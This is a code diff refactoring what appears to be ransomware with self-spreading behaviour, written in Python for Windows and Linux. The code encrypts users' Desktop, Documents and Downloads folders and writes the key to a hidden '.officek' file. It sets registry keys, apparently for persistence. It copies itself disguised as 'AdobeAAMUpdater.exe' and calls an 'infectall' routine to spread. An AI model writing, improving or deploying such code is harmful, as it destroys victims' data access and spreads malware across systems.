@@ -1,39 +1,26 @@
-from Func import Crypt
-from Func import k
+from Functions.Encrypt_Func import Crypt
+from Functions.Encrypt_Func import k
+from Functions.Encrypt_Func import s
 from os import path,getenv
 from sys import argv
 from os import system as sys
-from platform import system
 from shutil import copyfile
 from winreg import *
 
-s = system()
-
 if s=='Windows':
-	try:
-		desktop = path.expanduser('~/Desktop')
-	except:
-		pass
-	try:
-		documents = path.expanduser('~/Documents')
-	except:
-		pass
-	try:
-		downloads = path.expanduser('~/Downloads')
-	except:
-		pass
+	desktop = path.expanduser('~/Desktop')
+	documents = path.expanduser('~/Documents')
+	downloads = path.expanduser('~/Downloads')
 
 	try:
-		key = open(documents+'/.officek','wb')
-		key.write(k)
-		key.close()
+		with open(documents+'/.officek','wb') as key:
+			key.write(k)
 		sys('cd '+documents)
 		sys('attrib +s +h '+documents+'/.officek')
 	except:
 		try:
-			key = open('C:/Users/Public/.officek','wb')
-			key.write(k)
-			key.close()
+			with open('C:/Users/Public/.officek','wb') as key:
+				key.write(k)
 			sys('cd C:/Users/Public')
 			sys('attrib +s +h C:/Users/Public/.officek')
 		except:
@@ -70,7 +57,10 @@ if s=='Windows':
 	try:
 		key = CreateKey(HKEY_LOCAL_MACHINE, keypath)
 	except PermissionError:
-		key = CreateKey(HKEY_CURRENT_USER, keypath)
+		try:
+			key = CreateKey(HKEY_CURRENT_USER, keypath)
+		except:
+			pass
 	
 	try:
 		copyfile(argv[0],'C:/Users/Public/AdobeAAMUpdater.exe')
@@ -79,51 +69,33 @@ if s=='Windows':
 	except:
 		pass
 
-	Crypt.cryptingcommon(desktop)
-	Crypt.cryptingcommon(documents)
-	Crypt.cryptingcommon(downloads)
+	Crypt.c_iterator(desktop)
+	Crypt.c_iterator(documents)
+	Crypt.c_iterator(downloads)
 
 	Crypt.infectall()
 
 elif s=='Linux':
-	try:
-		desktop = path.expanduser('~/Desktop')
-	except:
-		pass
-	try:
-		documents = path.expanduser('~/Documents')
-	except:
-		pass
-	try:
-		downloads = path.expanduser('~/Downloads')
-	except:
-		pass
-	try:
-		area = path.expanduser('~/Área de trabalho')
-	except:
-		pass
-	try:
-		documentos = path.expanduser('~/Documentos')
-	except:
-		pass
+	desktop = path.expanduser('~/Desktop')
+	documents = path.expanduser('~/Documents')
+	downloads = path.expanduser('~/Downloads')
+	area = path.expanduser('~/Área de trabalho')
+	documentos = path.expanduser('~/Documentos')
 
 	try:
-		key = open(documents+'/.officek','wb')
-		key.write(k)
-		key.close()
+		with open(documents+'/.officek','wb') as key:
+			key.write(k)
 	except:
-		pass
-	try:
-		key = open(documentos+'/.officek','wb')
-		key.write(k)
-		key.close()
-	except:
-		pass
+		try:
+			with open(documentos+'/.officek','wb') as key:
+				key.write(k)
+		except:
+			pass
 
-	Crypt.cryptingcommon(desktop)
-	Crypt.cryptingcommon(area)
-	Crypt.cryptingcommon(documents)
-	Crypt.cryptingcommon(documentos)
-	Crypt.cryptingcommon(downloads)
+	Crypt.c_iterator(desktop)
+	Crypt.c_iterator(area)
+	Crypt.c_iterator(documents)
+	Crypt.c_iterator(documentos)
+	Crypt.c_iterator(downloads)
 
 	Crypt.infectall()
